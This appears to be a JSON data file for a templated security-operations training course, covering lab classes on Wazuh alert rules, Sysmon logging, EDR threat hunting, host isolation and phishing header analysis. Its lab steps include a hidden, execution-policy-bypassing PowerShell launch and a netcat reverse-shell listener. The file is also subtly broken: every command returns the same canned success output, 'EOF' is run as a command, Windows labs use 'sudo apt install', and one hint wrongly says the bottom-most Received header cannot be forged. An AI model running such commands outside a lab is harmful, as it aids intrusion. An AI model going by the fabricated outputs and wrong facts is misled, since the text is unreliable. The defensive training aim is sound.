          {
            "shell": "bash",
            "cmd": "EOF",
            "description": "Execute EOF command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "sudo /var/ossec/bin/wazuh-analysisd -t",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "sudo systemctl restart wazuh-manager",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          }
        ],
        "verification": "Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Wazuh Manager Server VM",
          "Wazuh Rule Engine",
          "Alert Rule 100002 triggers in dashboard ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why must frequency and timeframe thresholds be carefully tuned in SOC detection rules?",
        "hint": "Overly sensitive thresholds trigger alert fatigue; loose thresholds miss stealthy brute-force attacks."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Writing Custom SIEM Detection Rules?",
      "options": [
        "Build custom parsing logic to isolate security anomalies and filter out normal system traffic.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Build custom parsing logic to isolate security anomalies and filter out normal system traffic."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 35.",
    "eli5Story": {
      "title": "Teaching the Alarm Bell When to Ring (Custom SIEM Rules)",
      "analogy": "If someone drops a pencil, don't ring the fire alarm! But if someone tries 5 wrong keys in 1 minute, sound the siren! That is rule tuning."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 35",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Wazuh Rule Engine",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Wazuh Manager Server VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Wazuh Rule Engine"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y wazuh."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 36,
    "week": 18,
    "classNumber": 36,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 18: Threat Detection & Custom Alerting",
    "title": "Windows Event Log Analysis",
    "category": "Log Analysis",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Review endpoint telemetry logs to uncover suspicious system behaviors.",
    "tools": [
      "Sysmon",
      "Windows Event Viewer",
      "PowerShell"
    ],
    "targetEnvironment": "Windows 10 VM",
    "topology": {
      "description": "Lab topology for Windows Event Log Analysis",
      "nodes": [
        {
          "id": "source",
          "label": "Sysmon",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Windows",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Log Analysis",
        "explanation": "Review endpoint telemetry logs to uncover suspicious system behaviors."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Windows Event Log Analysis",
        "description": "Verify system connectivity and tool installation in Windows 10 VM.",
        "commands": [
          {
            "shell": "windows",
            "cmd": "sysmon.exe -accepteula -i sysmonconfig-export.xml",
            "description": "Execute sysmon.exe command",
            "output": "[+] Command executed successfully.\nOutput: Sysmon Event ID 1 captures parent process, child process, command line flags, and SHA256 hash."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Windows Event Log Analysis",
        "description": "Deploy Microsoft Sysmon on a Windows client host using a standardized security configuration file. Run a hidden background task script (e.g., spawning a suspicious terminal sub-process from a text application). Filter for Sysmon Event ID 1 (Process Creation) within the viewer to map out the malicious execution path.",
        "commands": [
          {
            "shell": "windows",
            "cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Write-Output Malicious\"",
            "description": "Execute powershell.exe command",
            "output": "[+] Command executed successfully.\nOutput: Sysmon Event ID 1 captures parent process, child process, command line flags, and SHA256 hash."
          },
          {
            "shell": "windows",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 5 | Format-List TimeCreated, Message",
            "description": "Execute Get-WinEvent command",
            "output": "[+] Command executed successfully.\nOutput: Sysmon Event ID 1 captures parent process, child process, command line flags, and SHA256 hash."
          }
        ],
        "verification": "Sysmon Event ID 1 captures parent process, child process, command line flags, and SHA256 hash.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Windows 10 VM",
          "Sysmon",
          "Sysmon Event ID 1 captures parent proces...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is Sysmon Event ID 1 critical for detecting lolbins (Living-off-the-Land Binaries)?",
        "hint": "It records the exact command-line arguments passed to legitimate tools like powershell and certutil."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Windows Event Log Analysis?",
      "options": [
        "Review endpoint telemetry logs to uncover suspicious system behaviors.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Review endpoint telemetry logs to uncover suspicious system behaviors."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 36.",
    "eli5Story": {
      "title": "The Detective's Microscopic Notebook (Windows Sysmon)",
      "analogy": "Sysmon writes down the exact name of every program that woke up, who woke it up, and what command parameters it carried in its backpack."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 36",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Sysmon",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Windows 10 VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Sysmon"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y sysmon."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 37,
    "week": 19,
    "classNumber": 37,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 19: Endpoint Detection & Response (EDR)",
    "title": "Threat Hunting with an EDR Telemetry Tool",
    "category": "EDR & Hunting",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Analyze active processes and network loops across remote system architectures.",
    "tools": [
      "LimaCharlie EDR",
      "Wazuh XDR",
      "Process Explorer"
    ],
    "targetEnvironment": "Monitored Windows 10 VM",
    "topology": {
      "description": "Lab topology for Threat Hunting with an EDR Telemetry Tool",
      "nodes": [
        {
          "id": "source",
          "label": "LimaCharlie EDR",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Monitored",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "EDR & Hunting",
        "explanation": "Analyze active processes and network loops across remote system architectures."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Threat Hunting with an EDR Telemetry Tool",
        "description": "Verify system connectivity and tool installation in Monitored Windows 10 VM.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sensor.processes.list()",
            "description": "Execute sensor.processes.list() command",
            "output": "[+] Command executed successfully.\nOutput: Fake svchost.exe running from C:\\Users\\Public detected; active C2 TCP socket identified."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Threat Hunting with an EDR Telemetry Tool",
        "description": "Connect a target client host to the LimaCharlie EDR framework platform. Generate a malicious payload that runs silently in the background, masquerading under a common file title (e.g., svchost.exe). Use the analyst console's process explorer view to locate the unverified file path and trace its open network ports.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sensor.netstat.list()",
            "description": "Execute sensor.netstat.list() command",
            "output": "[+] Command executed successfully.\nOutput: Fake svchost.exe running from C:\\Users\\Public detected; active C2 TCP socket identified."
          }
        ],
        "verification": "Fake svchost.exe running from C:\\Users\\Public detected; active C2 TCP socket identified.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Monitored Windows 10 VM",
          "LimaCharlie EDR",
          "Fake svchost.exe running from C:\\Users\\P...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How do threat actors use process masquerading to blend in with legitimate OS tasks?",
        "hint": "They name malware files after Windows core services (e.g. svchost, lsass) in non-standard folders."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Threat Hunting with an EDR Telemetry Tool?",
      "options": [
        "Analyze active processes and network loops across remote system architectures.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Analyze active processes and network loops across remote system architectures."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 37.",
    "eli5Story": {
      "title": "Finding the Sneaky Wolf in Sheep's Clothing (EDR Hunting)",
      "analogy": "A sneaky wolf puts on a sheep sweater and says 'My name is svchost.exe!'. The EDR detective looks at where it lives and what it is whispering into the network to catch the fake!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 37",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with LimaCharlie EDR",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Monitored Windows 10 VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using LimaCharlie EDR"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y limacharlie."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 38,
    "week": 19,
    "classNumber": 38,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 19: Endpoint Detection & Response (EDR)",
    "title": "Live Incident Containment & Isolation",
    "category": "Incident Containment",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Quarantine a compromised host system to stop threats from moving across the network.",
    "tools": [
      "EDR Console",
      "Reverse Shell Payload",
      "Kali Linux"
    ],
    "targetEnvironment": "Attacker (Kali) & Victim (Windows)",
    "topology": {
      "description": "Lab topology for Live Incident Containment & Isolation",
      "nodes": [
        {
          "id": "source",
          "label": "EDR Console",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Attacker",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Incident Containment",
        "explanation": "Quarantine a compromised host system to stop threats from moving across the network."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Live Incident Containment & Isolation",
        "description": "Verify system connectivity and tool installation in Attacker (Kali) & Victim (Windows).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "nc -lvnp 4444",
            "description": "Execute nc command",
            "output": "[+] Command executed successfully.\nOutput: Victim is isolated from network; attacker shell terminated; telemetry channel preserved."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Live Incident Containment & Isolation",
        "description": "Establish a live attack connection from a Kali VM into a victim client station. From the EDR management workstation console, run an emergency isolation command to disconnect the target from the local network. Confirm that the attack connection is severed while preserving the analyst's investigative management access.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "nc -lvnp 4444",
            "description": "Execute nc command",
            "output": "[+] Command executed successfully.\nOutput: Victim is isolated from network; attacker shell terminated; telemetry channel preserved."
          }
        ],
        "verification": "Victim is isolated from network; attacker shell terminated; telemetry channel preserved.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Attacker (Kali) & Victim (Windows)",
          "EDR Console",
          "Victim is isolated from network; attacke...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does EDR network isolation allow cloud sensor communication while blocking all other traffic?",
        "hint": "So forensic investigators can continue pulling artifacts and live memory without spreading the infection."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Live Incident Containment & Isolation?",
      "options": [
        "Quarantine a compromised host system to stop threats from moving across the network.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Quarantine a compromised host system to stop threats from moving across the network."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 38.",
    "eli5Story": {
      "title": "The Emergency Safety Bubble (Live EDR Isolation)",
      "analogy": "When a computer is infected, we hit the red button! An invisible bubble wraps around it: it can't talk to any other computers, but the detective can still look inside!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 38",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with EDR Console",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Attacker (Kali) & Victim (Windows)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using EDR Console"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y edr."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 39,
    "week": 20,
    "classNumber": 39,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 20: Phishing Triage & Email Analysis",
    "title": "Email Header Deconstruction",
    "category": "Phishing Triage",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Parse email transmission strings to track origin points and confirm message authenticity.",
    "tools": [
      "MXToolbox",
      "Text Editors",
      "EML Parser"
    ],
    "targetEnvironment": "Raw sample .eml files",
    "topology": {
      "description": "Lab topology for Email Header Deconstruction",
      "nodes": [
        {
          "id": "source",
          "label": "MXToolbox",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Raw",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Phishing Triage",
        "explanation": "Parse email transmission strings to track origin points and confirm message authenticity."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Email Header Deconstruction",
        "description": "Verify system connectivity and tool installation in Raw sample .eml files.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "grep -E '^(From|To|Subject|Date|Return-Path|Authentication-Results):' sample_phish.eml",
            "description": "Execute grep command",
            "output": "[+] Command executed successfully.\nOutput: Originating server IP isolated; SPF=fail and DKIM=none confirm spoofed sender identity."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Email Header Deconstruction",
        "description": "Open a raw phishing payload file (.eml) in a text environment. Extract and review the SPF, DKIM, and DMARC validation status records to verify domain spoofing indicators, and track the hop trail within the Received: block to isolate the adversary's originating server IP.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "grep -A 2 -E '^(Received:)' sample_phish.eml",
            "description": "Execute grep command",
            "output": "[+] Command executed successfully.\nOutput: Originating server IP isolated; SPF=fail and DKIM=none confirm spoofed sender identity."
          }
        ],
        "verification": "Originating server IP isolated; SPF=fail and DKIM=none confirm spoofed sender identity.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Raw sample .eml files",
          "MXToolbox",
          "Originating server IP isolated; SPF=fail...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is the bottom-most 'Received:' header line the most trustworthy in email tracking?",
        "hint": "The first MTA hop is recorded by the initial receiving mail server, which the sender cannot forge."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Email Header Deconstruction?",
      "options": [
        "Parse email transmission strings to track origin points and confirm message authenticity.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Parse email transmission strings to track origin points and confirm message authenticity."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 39.",
    "eli5Story": {
      "title": "Checking the Return Address on the Fake Birthday Card (Phishing Headers)",
      "analogy": "You get a letter that says 'Free Ice Cream from Santa!'. You flip the envelope over and see a stamp from a stranger down the street. That is checking email headers."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 39",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with MXToolbox",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Raw sample .eml files"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
